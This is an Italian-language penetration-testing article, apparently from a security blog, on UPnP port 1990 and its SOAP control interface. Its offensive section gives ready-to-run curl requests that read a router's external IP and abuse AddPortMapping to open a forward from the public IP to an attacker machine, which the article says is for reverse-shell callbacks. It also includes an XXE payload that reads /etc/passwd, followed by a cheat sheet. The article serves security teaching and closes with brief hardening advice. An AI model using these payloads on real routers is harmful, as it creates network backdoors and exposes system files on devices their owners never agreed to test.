---
title: 'Porta 1990 UPnP: SOAP, Port Mapping e Device Control'
slug: porta-1990-upnp
description: >-
  Porta 1990 UPnP nel pentest: SOAP action, port mapping abuse, device control e
  analisi dei servizi IGD esposti sul router.
image: /porta-1990-upnp.webp
draft: false
date: 2026-04-12T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - UPnP
  - SOAP
  - Port Mapping
  - IGD
---

> **Executive Summary** — La porta 1990 è una delle porte associate a UPnP (Universal Plug and Play), tipicamente usata per il control point HTTP dove i dispositivi UPnP espongono le loro azioni SOAP. Mentre la porta 1900/UDP gestisce il discovery (SSDP), la 1990 (e altre porte HTTP variabili) ospita le interfacce di controllo dei dispositivi. Qui si invocano le azioni: AddPortMapping su router, SetVolume su media renderer, Browse su media server. Per il contesto completo su SSDP e discovery UPnP, consulta la [guida alla porta 1900 SSDP](https://hackita.it/articoli/porta-1900-ssdp).

**Cos’è la porta 1990 (UPnP Control Point / SOAP)**

* La porta 1990 espone il control point UPnP — l'interfaccia SOAP dove si eseguono azioni sui dispositivi
* Le azioni SOAP includono port forwarding (AddPortMapping), browsing contenuti e configurazione del dispositivo
* SOAP injection e XXE sono i principali vettori di attacco su implementazioni UPnP vulnerabili  i

## 1. Relazione con Porta 1900

| Porta        | Protocollo    | Ruolo UPnP                   |
| ------------ | ------------- | ---------------------------- |
| 1900/UDP     | SSDP          | Discovery (M-SEARCH, NOTIFY) |
| **1990/TCP** | **HTTP/SOAP** | **Device control (azioni)**  |
| Varie        | HTTP          | Device description (XML)     |
| Varie        | HTTP          | Eventing (SUBSCRIBE)         |

Il flusso: SSDP (1900) scopre i dispositivi → il `LOCATION` header punta all'XML di descrizione → l'XML contiene il `controlURL` (spesso sulla 1990 o porta simile) → le azioni SOAP si invocano su quel URL.

## 2. Enumerazione

### Scan e identificazione

```bash
nmap -sV -p 1990 10.10.10.1
```

**Output:**

```
PORT     STATE SERVICE VERSION
1990/tcp open  http    MiniUPnPd
```

### SOAP action enumeration

```bash
# Ottieni il SCPD (Service Control Protocol Description)
curl -s http://10.10.10.1:1990/WANIPCn.xml
```

**Output:**

```xml
<actionList>
  <action>
    <name>AddPortMapping</name>
  </action>
  <action>
    <name>DeletePortMapping</name>
  </action>
  <action>
    <name>GetExternalIPAddress</name>
  </action>
  <action>
    <name>GetGenericPortMappingEntry</name>
  </action>
</actionList>
```

**Lettura dell'output:** quattro azioni disponibili. `AddPortMapping` crea port forwarding. `GetExternalIPAddress` rivela l'IP pubblico del router. `GetGenericPortMappingEntry` lista i forwarding esistenti.

## 3. Tecniche Offensive

**Invoke SOAP action — GetExternalIPAddress**

```bash
curl -s -X POST http://10.10.10.1:1990/ctl/IPConn \
  -H "Content-Type: text/xml; charset=utf-8" \
  -H "SOAPAction: \"urn:schemas-upnp-org:service:WANIPConnection:1#GetExternalIPAddress\"" \
  -d '<?xml version="1.0"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
  <s:Body>
    <u:GetExternalIPAddress xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"/>
  </s:Body>
</s:Envelope>'
```

**Output:**

```xml
<NewExternalIPAddress>203.0.113.50</NewExternalIPAddress>
```

**AddPortMapping — crea forwarding**

```bash
curl -s -X POST http://10.10.10.1:1990/ctl/IPConn \
  -H "Content-Type: text/xml; charset=utf-8" \
  -H "SOAPAction: \"urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\"" \
  -d '<?xml version="1.0"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
  <s:Body>
    <u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">
      <NewRemoteHost></NewRemoteHost>
      <NewExternalPort>44444</NewExternalPort>
      <NewProtocol>TCP</NewProtocol>
      <NewInternalPort>4444</NewInternalPort>
      <NewInternalClient>10.10.10.200</NewInternalClient>
      <NewEnabled>1</NewEnabled>
      <NewPortMappingDescription>pentest</NewPortMappingDescription>
      <NewLeaseDuration>0</NewLeaseDuration>
    </u:AddPortMapping>
  </s:Body>
</s:Envelope>'
```

**Cosa fai dopo:** la porta 44444 sull'IP pubblico del router ora punta alla tua macchina (10.10.10.200:4444). Da Internet: reverse shell callback, accesso a servizi interni. Questo è il vettore che [malware IoT usa per la persistenza](https://hackita.it/articoli/post-exploitation).

**XXE injection su SOAP parser**

```bash
curl -X POST http://10.10.10.1:1990/ctl/IPConn \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
  <s:Body><test>&xxe;</test></s:Body>
</s:Envelope>'
```

Se il parser XML del dispositivo è vulnerabile a XXE, ottieni il contenuto di `/etc/passwd`.

## 4. Cheat Sheet Finale

| Azione           | Comando                                                 |
| ---------------- | ------------------------------------------------------- |
| Scan             | `nmap -sV -p 1990 [target]`                             |
| SCPD             | `curl http://[target]:1990/[scpd_path].xml`             |
| Get external IP  | SOAP POST `GetExternalIPAddress`                        |
| Add forwarding   | SOAP POST `AddPortMapping`                              |
| List forwarding  | SOAP POST `GetGenericPortMappingEntry` (index 0,1,2...) |
| XXE test         | XXE payload nel SOAP body                               |
| upnpc (shortcut) | `upnpc -a [ip] [int_port] [ext_port] TCP`               |

### Perché Porta 1990 è rilevante

È il control plane di UPnP — dove le azioni si eseguono. AddPortMapping senza auth è il rischio principale: crea backdoor di rete. XXE su device embedded è ancora possibile. Per il discovery, vedi [porta 1900 SSDP](https://hackita.it/articoli/porta-1900-ssdp).

### Hardening

Identico alla porta 1900: disabilita UPnP se non necessario. Limita alla LAN. Firmware aggiornato.

***

Riferimento: UPnP Device Architecture 2.0, UPnP IGD specification. Uso esclusivo in ambienti autorizzati.

> [hackita.it/supporto](https://hackita.it/supporto) — [hackita.it/servizi](https://hackita.it/servizi).
